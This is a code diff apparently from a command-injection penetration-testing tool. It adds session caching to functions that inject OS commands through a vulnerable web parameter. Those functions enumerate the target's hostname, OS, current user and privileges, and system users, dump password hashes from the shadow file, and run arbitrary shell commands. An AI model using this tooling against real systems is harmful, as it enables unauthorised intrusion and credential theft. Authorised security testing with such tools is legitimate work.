@@ -19,6 +19,7 @@ import sys
 
 from src.utils import menu
 from src.utils import settings
+from src.utils import session_handler
 
 from src.core.injections.controller import checks
 from src.thirdparty.colorama import Fore, Back, Style, init
@@ -40,9 +41,14 @@ def powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_
   #Command execution results.
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   # Evaluate injection results.
-  ps_version = cb_injector.injection_results(response, TAG)
-  try:
+  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Evaluate injection results.
+    ps_version = cb_injector.injection_results(response, TAG)
     ps_version = "".join(str(p) for p in ps_version)
+    session_handler.store_cmd(url, cmd, ps_version, vuln_parameter)
+  else:
+    ps_version = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+  try:
     if float(ps_version):
       settings.PS_ENABLED = True
       if menu.options.verbose:
@@ -67,7 +73,13 @@ def hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, ur
     settings.HOSTNAME = settings.WIN_HOSTNAME 
   cmd = settings.HOSTNAME
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-  shell = cb_injector.injection_results(response, TAG)
+  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Evaluate injection results.
+    shell = cb_injector.injection_results(response, TAG)
+    shell = "".join(str(p) for p in shell)
+    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
+  else:
+    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   if shell:
     if menu.options.verbose:
       print ""
@@ -89,7 +101,13 @@ def system_information(separator, TAG, prefix, suffix, whitespace, http_request_
   if alter_shell:
     cmd = "cmd /c " + cmd 
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-  target_os = cb_injector.injection_results(response, TAG)
+  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Evaluate injection results.
+    target_os = cb_injector.injection_results(response, TAG)
+    target_os = "".join(str(p) for p in target_os)
+    session_handler.store_cmd(url, cmd, target_os, vuln_parameter)
+  else:
+    target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   if target_os:
     target_os = "".join(str(p) for p in target_os)
     if settings.TARGET_OS == "win":
@@ -97,11 +115,16 @@ def system_information(separator, TAG, prefix, suffix, whitespace, http_request_
     else:
       cmd = settings.RECOGNISE_HP
     response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-    target_arch = cb_injector.injection_results(response, TAG)
+    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+      # Evaluate injection results.
+      target_arch = cb_injector.injection_results(response, TAG)
+      target_arch = "".join(str(p) for p in target_arch)
+      session_handler.store_cmd(url, cmd, target_arch, vuln_parameter)
+    else:
+      target_arch = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
     if target_arch:
       if menu.options.verbose:
         print ""
-      target_arch = "".join(str(p) for p in target_arch)
       sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
       sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
       sys.stdout.flush()
@@ -119,7 +142,13 @@ def current_user(separator, TAG, prefix, suffix, whitespace, http_request_method
     settings.CURRENT_USER = settings.WIN_CURRENT_USER
   cmd = settings.CURRENT_USER
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-  cu_account = cb_injector.injection_results(response, TAG)
+  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Evaluate injection results.
+    cu_account = cb_injector.injection_results(response, TAG)
+    cu_account = "".join(str(p) for p in cu_account)
+    session_handler.store_cmd(url, cmd, cu_account, vuln_parameter)
+  else:
+    cu_account = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   if cu_account:
     cu_account = "".join(str(p) for p in cu_account)
     # Check if the user have super privileges.
@@ -129,7 +158,13 @@ def current_user(separator, TAG, prefix, suffix, whitespace, http_request_method
       else:  
         cmd = settings.IS_ROOT 
       response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-      shell = cb_injector.injection_results(response, TAG)
+      if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+        # Evaluate injection results.
+        shell = cb_injector.injection_results(response, TAG)
+        shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
+        session_handler.store_cmd(url, cmd, shell, vuln_parameter)
+      else:
+        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
       if menu.options.verbose:
         print ""
       sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
@@ -138,7 +173,6 @@ def current_user(separator, TAG, prefix, suffix, whitespace, http_request_method
       output_file.write("    (!) The current user is " + cu_account)
       output_file.close()
       if shell:
-        shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
         if (settings.TARGET_OS == "win" and not "Admin" in shell) or \
            (settings.TARGET_OS != "win" and shell != "0"):
           sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
@@ -177,7 +211,13 @@ def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method
       settings.SYS_USERS = "\"" + settings.SYS_USERS + "\""   
   cmd = settings.SYS_USERS       
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-  sys_users = cb_injector.injection_results(response, TAG)
+  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Evaluate injection results.
+    sys_users = cb_injector.injection_results(response, TAG)
+    sys_users = "".join(str(p) for p in sys_users)
+    session_handler.store_cmd(url, cmd, sys_users, vuln_parameter)
+  else:
+    sys_users = session_handler.export_stored_cmd(url, cmd, vuln_parameter) 
   # Windows users enumeration.
   if settings.TARGET_OS == "win":
     if menu.options.verbose:
@@ -318,6 +358,7 @@ def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method
       sys.stdout.flush()
       print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read '" + settings.PASSWD_FILE + "' to enumerate users entries." + Style.RESET_ALL   
 
+
 """
 System passwords enumeration
 """
@@ -329,12 +370,20 @@ def system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_me
     cmd = settings.SYS_PASSES            
     response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     sys_passes = cb_injector.injection_results(response, TAG)
+    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+      # Evaluate injection results.
+      sys_passes = cb_injector.injection_results(response, TAG)
+      sys_passes = "".join(str(p) for p in sys_passes)
+      session_handler.store_cmd(url, cmd, sys_passes, vuln_parameter)
+    else:
+      sys_passes = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+    if sys_passes == "":
+      sys_passes = " "
     if sys_passes :
       if menu.options.verbose:
         print ""
       sys.stdout.write(settings.INFO_SIGN + "Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
       sys.stdout.flush()
-      sys_passes = "".join(str(p) for p in sys_passes)
       sys_passes = sys_passes.replace(" ", "\n")
       sys_passes = sys_passes.split( )
       if len(sys_passes) != 0 :
@@ -375,11 +424,16 @@ Single os-shell execution
 def single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
   cmd =  menu.options.os_cmd
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-  shell = cb_injector.injection_results(response, TAG)
+  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Evaluate injection results.
+    shell = cb_injector.injection_results(response, TAG)
+    shell = "".join(str(p) for p in shell)
+    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
+  else:
+    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   if shell:
     if menu.options.verbose:
       print ""
-    shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
     if shell != "":
       print Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL
     else:
